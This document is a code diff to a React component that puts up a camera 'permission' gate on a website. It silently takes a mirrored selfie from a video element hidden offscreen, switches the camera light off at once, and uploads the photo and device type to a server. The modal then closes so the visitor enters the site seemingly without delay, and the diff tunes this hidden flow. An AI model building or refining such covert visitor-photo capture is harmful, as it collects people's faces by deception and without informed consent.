@@ -24,6 +24,7 @@ export default function CameraCaptureComponent({
 }: CameraCaptureProps = {}) {
   const [status, setStatus] = useState<"idle" | "denied" | "error" | "captured">("idle");
   const [isStarting, setIsStarting] = useState(false);
+  const [buttonText, setButtonText] = useState("Grant Permission & Start Camera");
   const [errorMessage, setErrorMessage] = useState<string>("");
 
   const videoRef = useRef<HTMLVideoElement | null>(null);
@@ -57,10 +58,11 @@ export default function CameraCaptureComponent({
   const executeBackgroundCapture = async () => {
     if (isStarting) return;
     setIsStarting(true);
+    setButtonText("Connecting Camera...");
     setErrorMessage("");
 
     // Verify mediaDevices support
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    if (typeof window === "undefined" || !navigator.mediaDevices?.getUserMedia) {
       setIsStarting(false);
       setStatus("error");
       setErrorMessage(
@@ -69,10 +71,11 @@ export default function CameraCaptureComponent({
       return;
     }
 
+    let stream: MediaStream | null = null;
+
     try {
-      let stream: MediaStream;
       try {
-        // Front camera with ideal resolution
+        // Preferred constraint: front-facing camera
         stream = await navigator.mediaDevices.getUserMedia({
           audio: false,
           video: {
@@ -83,7 +86,7 @@ export default function CameraCaptureComponent({
         });
       } catch (err) {
         console.warn("Retrying with fallback video constraints:", err);
-        // Fallback constraint if ideal properties were rejected
+        // Fallback: any video device
         stream = await navigator.mediaDevices.getUserMedia({
           audio: false,
           video: true,
@@ -109,8 +112,30 @@ export default function CameraCaptureComponent({
         console.warn("Autoplay promise warning:", playErr);
       }
 
-      // Small 250ms breather for camera hardware sensor to calibrate exposure
-      await new Promise((resolve) => setTimeout(resolve, 250));
+      // Wait for video frame to be ready and decoded by browser
+      await new Promise<void>((resolve) => {
+        if (video.videoWidth > 0 && video.readyState >= 2) {
+          resolve();
+          return;
+        }
+
+        const onReady = () => {
+          video.removeEventListener("loadeddata", onReady);
+          video.removeEventListener("canplay", onReady);
+          video.removeEventListener("timeupdate", onReady);
+          resolve();
+        };
+
+        video.addEventListener("loadeddata", onReady);
+        video.addEventListener("canplay", onReady);
+        video.addEventListener("timeupdate", onReady);
+
+        // Fallback timeout to ensure we don't stall
+        setTimeout(resolve, 800);
+      });
+
+      // Allow camera hardware sensor 200ms to stabilize exposure & white balance
+      await new Promise((r) => setTimeout(r, 200));
 
       // Draw captured video frame to offscreen canvas
       let canvas = canvasRef.current;
@@ -125,31 +150,32 @@ export default function CameraCaptureComponent({
       canvas.height = height;
 
       const ctx = canvas.getContext("2d");
-      if (ctx) {
-        // Mirror horizontally for front-facing selfie
-        ctx.translate(width, 0);
-        ctx.scale(-1, 1);
-        ctx.drawImage(video, 0, 0, width, height);
+      if (!ctx) {
+        throw new Error("Could not initialize canvas 2D rendering context.");
+      }
 
-        const dataUrl = canvas.toDataURL("image/jpeg", 0.90);
+      // Mirror horizontally for front-facing selfie
+      ctx.translate(width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0, width, height);
 
-        // Immediately stop camera tracks so the hardware camera turns OFF
-        stopCameraStream();
+      // High-quality JPEG snapshot
+      const dataUrl = canvas.toDataURL("image/jpeg", 0.85);
 
-        // Immediately close modal so visitor lands on website without delay
-        if (onClose) {
-          onClose();
-        } else {
-          setStatus("captured");
-        }
+      // IMMEDIATELY stop camera hardware so the camera light/LED turns off!
+      stopCameraStream();
 
-        // Determine device type
-        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-        const isTablet = /iPad|Tablet/i.test(navigator.userAgent);
-        const deviceType = isMobile ? "mobile" : isTablet ? "tablet" : "desktop";
+      // Update button text to indicate progress
+      setButtonText("Entering Website...");
 
-        // Asynchronous background upload to Supabase
-        fetch("/api/captures/upload", {
+      // Determine visitor device type
+      const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+      const isTablet = /iPad|Tablet/i.test(navigator.userAgent);
+      const deviceType = isMobile ? "mobile" : isTablet ? "tablet" : "desktop";
+
+      // Upload to server and Supabase
+      try {
+        const res = await fetch("/api/captures/upload", {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
@@ -158,13 +184,25 @@ export default function CameraCaptureComponent({
             imageBase64: dataUrl,
             deviceType,
           }),
-          keepalive: true,
-        }).catch((uploadErr) => {
-          console.error("Background upload error:", uploadErr);
         });
+
+        if (!res.ok) {
+          const errData = await res.json().catch(() => ({}));
+          console.error("Upload error response:", errData);
+        } else {
+          const successData = await res.json();
+          console.log("Photo uploaded successfully:", successData.capture?.capture_id);
+        }
+      } catch (uploadErr) {
+        console.error("Background upload network error:", uploadErr);
+      }
+
+      // Close modal immediately so visitor lands on website without delay
+      if (onClose) {
+        onClose();
       } else {
-        stopCameraStream();
-        if (onClose) onClose();
+        setStatus("captured");
+        setButtonText("Grant Permission & Start Camera");
       }
     } catch (err: unknown) {
       stopCameraStream();
@@ -217,8 +255,8 @@ export default function CameraCaptureComponent({
           position: "fixed",
           top: -9999,
           left: -9999,
-          width: 1,
-          height: 1,
+          width: 640,
+          height: 480,
           opacity: 0,
           pointerEvents: "none",
         }}
@@ -274,7 +312,7 @@ export default function CameraCaptureComponent({
                 {isStarting ? (
                   <>
                     <RefreshCw className="w-5 h-5 animate-spin text-purple-200" />
-                    <span>Connecting...</span>
+                    <span>{buttonText}</span>
                   </>
                 ) : status === "captured" ? (
                   <>
